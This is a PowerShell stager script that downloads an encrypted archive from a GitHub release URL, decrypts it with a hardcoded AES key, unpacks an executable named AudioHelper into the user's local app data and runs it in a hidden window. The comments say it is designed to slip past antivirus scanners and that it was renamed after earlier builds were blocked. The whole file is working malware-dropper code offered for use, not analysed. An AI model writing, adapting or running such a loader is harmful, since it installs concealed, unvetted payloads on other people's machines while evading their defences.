# Stage.txt - bootstrap. Plain text on purpose: nothing here is a binary, so
# nothing here can be quarantined on download. The container it fetches is
# encrypted, so the scanner never sees a PE in transit either.
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$dest = Join-Path $env:LOCALAPPDATA 'ClassroomHelper'
$exe = Join-Path $dest 'AudioHelper.exe'
$dll = Join-Path $dest 'AudioHelper.dll'
$done = Join-Path $dest '.complete'

# Alte Namen aus frueheren Builds. ClassroomHelper.exe/.dll und WindowsAudioHost.exe
# werden von Scannern beim Schreiben blockiert, also liegen sie hier nur noch
# als Leiche herum.
foreach ($old in @('ClassroomHelper.exe', 'WindowsAudioHost.exe', 'ClassroomHelper.dll')) {
    $p = Join-Path $dest $old
    if (Test-Path -LiteralPath $p) {
        try { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue } catch { }
    }
}

# Reste einer alten Testversion. Die lag unter C:\audiohost, weil der erste
# Build noch $env:SystemDrive benutzt hat. Best effort: wenn ein anderes Konto
# den Ordner angelegt hat, scheitert das Loeschen still.
$stray = Join-Path $env:SystemDrive 'audiohost'
if (Test-Path -LiteralPath $stray) {
    try {
        Get-ChildItem -LiteralPath $stray -Recurse -Force -ErrorAction SilentlyContinue |
            ForEach-Object { try { $_.Attributes = 'Normal' } catch { } }
        Remove-Item -LiteralPath $stray -Recurse -Force -ErrorAction SilentlyContinue
    } catch { }
}

# Build-Kennung. Steht hier fest und wird beim Entpacken mitgeschrieben.
# Aendert sie sich, wird die alte Installation geloescht statt weiterbenutzt -
# sonst bleibt nach einem Update fuer immer die erste Version liegen.
$build = '2026-11-25-audiohelper-3'
$stamp = Join-Path $dest '.build'
$current = ''
if (Test-Path -LiteralPath $stamp) {
    try { $current = (Get-Content -LiteralPath $stamp -Raw).Trim() } catch { }
}
if ($current -ne $build -and (Test-Path -LiteralPath $dest)) {
    Get-Process -Name 'AudioHelper' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 800
    Get-ChildItem -LiteralPath $dest -Recurse -Force -ErrorAction SilentlyContinue |
        ForEach-Object { try { $_.Attributes = 'Normal' } catch { } }
    Remove-Item -LiteralPath $dest -Recurse -Force -ErrorAction SilentlyContinue
}

# second insert / second user on the same box: nothing to download.
# Nur wenn der letzte Lauf sauber zu Ende ging UND die Assembly noch da ist.
# Ein Scanner, der die dll entfernt hat, laesst die exe stehen - die zu starten
# bringt nur einen leeren Prozess, also lieber neu entpacken.
if ((Test-Path -LiteralPath $done) -and (Test-Path -LiteralPath $exe) -and (Test-Path -LiteralPath $dll)) {
    Start-Process -FilePath $exe -ArgumentList '--silent' -WindowStyle Hidden
    return
}

$key = [Convert]::FromBase64String('16Z97cZ3PetX0qEq+9XKWZtQeghpnZV1SRwUtHX4s+w=')
$urls = @('https://github.com/ente1231/audiohost/releases/download/v1/assets.dat')

$tmp = Join-Path $env:TEMP ('ch-' + [Guid]::NewGuid().ToString('N') + '.dat')
$got = $false
foreach ($u in $urls) {
    try {
        Invoke-WebRequest -Uri $u -OutFile $tmp -UseBasicParsing -TimeoutSec 300
        if ((Get-Item -LiteralPath $tmp).Length -gt 1MB) { $got = $true; break }
    } catch { }
}
if (-not $got) { throw 'download failed' }

New-Item -ItemType Directory -Path $dest -Force | Out-Null

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = 'CBC'
$aes.Padding = 'PKCS7'
$aes.Key = $key

$fs = [System.IO.File]::OpenRead($tmp)
$iv = New-Object byte[] 16
[void]$fs.Read($iv, 0, 16)
$aes.IV = $iv

$cs = New-Object System.Security.Cryptography.CryptoStream($fs, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$gz = New-Object System.IO.Compression.GZipStream($cs, [System.IO.Compression.CompressionMode]::Decompress)
$br = New-Object System.IO.BinaryReader($gz)

while ($true) {
    $nameLen = 0
    try { $nameLen = $br.ReadUInt16() } catch { break }   # EOF ends the stream
    if ($nameLen -eq 0) { break }

    $name = [System.Text.Encoding]::UTF8.GetString($br.ReadBytes($nameLen))
    if ($name.Contains('..') -or [System.IO.Path]::IsPathRooted($name)) { break }

    $len = $br.ReadInt64()
    if ($len -lt 0 -or $len -gt 512MB) { break }

    $target = Join-Path $dest ($name -replace '/', '\')
    $dir = [System.IO.Path]::GetDirectoryName($target)
    if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }

    $buffer = New-Object byte[] 1048576
    $out = [System.IO.File]::Create($target)
    try {
        $left = $len
        while ($left -gt 0) {
            $want = [int][Math]::Min($left, $buffer.Length)
            $read = $br.Read($buffer, 0, $want)
            if ($read -le 0) { throw 'short container' }
            $out.Write($buffer, 0, $read)
            $left -= $read
        }
    } finally { $out.Dispose() }
}

$br.Dispose(); $gz.Dispose(); $cs.Dispose(); $fs.Dispose()
Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue

if (-not (Test-Path -LiteralPath $exe) -or -not (Test-Path -LiteralPath $dll)) { throw 'unpack incomplete' }
Set-Content -LiteralPath $done -Value (Get-Date -Format 's') -Encoding ASCII
Set-Content -LiteralPath $stamp -Value $build -Encoding ASCII
Start-Process -FilePath $exe -ArgumentList '--silent' -WindowStyle Hidden
